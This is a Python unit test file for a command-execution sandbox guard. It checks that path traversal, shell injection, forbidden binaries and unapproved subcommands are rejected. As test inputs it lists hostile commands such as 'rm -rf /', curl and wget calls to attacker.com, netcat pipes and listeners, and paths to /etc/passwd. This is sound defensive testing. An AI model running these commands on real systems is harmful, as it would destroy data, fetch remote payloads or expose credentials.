#!/usr/bin/env python3
"""
Unit and Adversarial Security Tests for SecurityPermissionGuard.
Verifies sandbox isolation, path traversal prevention, command allowlisting,
dangerous shell injection blocking, and timeout enforcement.
"""

import unittest
import os
import sys

# Add scripts directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "scripts")))

from security_permission_guard import SecurityPermissionGuard, SecuritySandboxViolation


class TestSecurityPermissionGuard(unittest.TestCase):
    def setUp(self):
        self.workspace_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
        self.guard = SecurityPermissionGuard(workspace_root=self.workspace_root)

    def test_path_traversal_rejections(self):
        """Must reject any path that attempts to escape workspace root."""
        adversarial_paths = [
            "../../Windows/System32/calc.exe",
            "../secret.txt",
            "../../etc/passwd",
            "C:\\Windows\\System32\\cmd.exe",
            "C:/boot.ini"
        ]
        for bad_path in adversarial_paths:
            with self.assertRaises(SecuritySandboxViolation, msg=f"Should reject: {bad_path}"):
                self.guard.validate_file_path(bad_path)

    def test_valid_path_inside_workspace(self):
        """Allows valid relative and absolute paths inside the workspace."""
        valid_rel = "scripts/security_permission_guard.py"
        resolved = self.guard.validate_file_path(valid_rel, must_exist=True)
        self.assertTrue(os.path.exists(resolved))
        self.assertTrue(resolved.startswith(self.workspace_root))

    def test_dangerous_metacharacter_injections(self):
        """Must reject any command containing dangerous shell chaining/redirection characters."""
        injections = [
            "git status ; rm -rf /",
            "git status && curl malicious.com",
            "python -c 'print(1)' | nc attacker 4444",
            "echo test > hacked.txt",
            "echo test < hacked.txt",
            "git status `id`",
            "echo $USER",
            "git status\nrm -rf *"
        ]
        for inj in injections:
            is_safe, reason, tokens = self.guard.audit_command_safety(inj)
            self.assertFalse(is_safe, f"Injection should be blocked: {inj}")
            self.assertIn("Tehlikeli kabuk karakteri", reason)

    def test_blocked_destructive_commands(self):
        """Must reject forbidden binaries such as rm, curl, powershell, etc."""
        forbidden = [
            "rm -rf ./tmp",
            "del /f /q c:\\test",
            "curl https://attacker.com/malware.sh",
            "wget https://attacker.com/exploit",
            "nc -l -p 8080",
            "powershell -ExecutionPolicy Bypass",
            "bash -c whoami",
            "taskkill /f /im explorer.exe"
        ]
        for cmd in forbidden:
            is_safe, reason, tokens = self.guard.audit_command_safety(cmd)
            self.assertFalse(is_safe, f"Forbidden command must be blocked: {cmd}")
            self.assertTrue("Yasaklı" in reason or "Tehlikeli" in reason or "izin listesinde" in reason)

    def test_unknown_binaries_rejected_by_allowlist(self):
        """Must reject arbitrary unapproved binaries."""
        unapproved = [
            "nmap 192.168.1.1",
            "ruby script.rb",
            "perl -e 'print 1'",
            "whoami"
        ]
        for cmd in unapproved:
            is_safe, reason, tokens = self.guard.audit_command_safety(cmd)
            self.assertFalse(is_safe, f"Unapproved binary must be blocked: {cmd}")
            self.assertIn("izin listesinde (Allowlist) bulunmuyor", reason)

    def test_disallowed_subcommands(self):
        """Even if binary is allowed (e.g. git), unauthorized actions (e.g. git push) are vetoed."""
        unauthorized = "git push origin master"
        is_safe, reason, tokens = self.guard.audit_command_safety(unauthorized)
        self.assertFalse(is_safe)
        self.assertIn("Komut argümanı onaylanmadı", reason)

    def test_allowed_command_execution(self):
        """Allowed commands run successfully through shell=False sandbox."""
        result = self.guard.execute_sandboxed_command("python --version", timeout_seconds=5)
        self.assertEqual(result["status"], "SUCCESS")
        self.assertEqual(result["exit_code"], 0)
        self.assertTrue(result["security_audit"]["safe"])
        self.assertTrue("Python" in result["stdout"] or "Python" in result["stderr"])

    def test_sandboxed_execution_vetoes_malicious_command(self):
        """execute_sandboxed_command immediately vetoes malicious commands without executing subprocess."""
        result = self.guard.execute_sandboxed_command("del /f *", timeout_seconds=5)
        self.assertEqual(result["status"], "SECURITY_VETO")
        self.assertEqual(result["exit_code"], -1)
        self.assertFalse(result["security_audit"]["safe"])


if __name__ == "__main__":
    unittest.main()
